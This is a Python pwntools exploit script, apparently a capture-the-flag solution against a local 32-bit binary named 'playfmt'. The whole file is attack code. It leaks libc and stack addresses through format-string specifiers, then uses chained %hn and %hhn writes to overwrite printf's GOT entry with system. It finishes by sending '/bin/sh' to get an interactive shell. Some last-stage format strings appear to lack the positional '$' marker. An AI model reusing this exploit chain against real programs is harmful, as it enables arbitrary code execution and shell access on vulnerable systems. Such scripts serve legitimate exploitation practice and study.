#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.arch = 'i386'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process("./playfmt")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elf = ELF("./playfmt")

#  gdb.attach(io, "b *do_fmt+64\nc")
io.send("..%8$p....%6$p..\0")
io.recvuntil("..")
libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['_IO_2_1_stdout_']
success("libc.address -> {:#x}".format(libc.address))
io.recvuntil("..")
stack = int(io.recvuntil("..", drop = True), 16) - 0x28
success("stack -> {:#x}".format(stack))
pause()

payload = "%{}c%{}$hn".format((stack + 0x1c) & 0xffff, 0x15)
#  payload += "%{}c%{}$hn".format((stack + 0x2c) & 0xffff - (stack + 0x1c) & 0xffff, 0x16)
payload += "%{}c%{}$hn".format(0x10, 0x16)
payload += '\0'
info(payload)
io.send(payload)
pause()

#  gdb.attach(io, "b *do_fmt+64\nc")
payload = "%{}c%{}$hn".format(elf.got['printf'] & 0xffff, 0x39)
#  payload += "%{}c%{}$hn".format((elf.got['printf'] & 0xffff + 2) - (elf.got['printf'] & 0xffff), 0x3b)
payload += "%{}c%{}$hn".format(2, 0x3b)
payload += "\0"
info(payload)
io.send(payload)
pause()

#  gdb.attach(io, "b *do_fmt+64\nc")
payload = "%{}c%{}hhn".format(libc.sym['system'] >> 16 & 0xff, 0xb)
payload += "%{}c%{}hn".format((libc.sym['system'] & 0xffff) - (libc.sym['system'] & 0xff), 0x7)
payload += '\0'
info(payload)
io.send(payload)
pause()

io.send("/bin/sh\0")

io.interactive()
io.close()
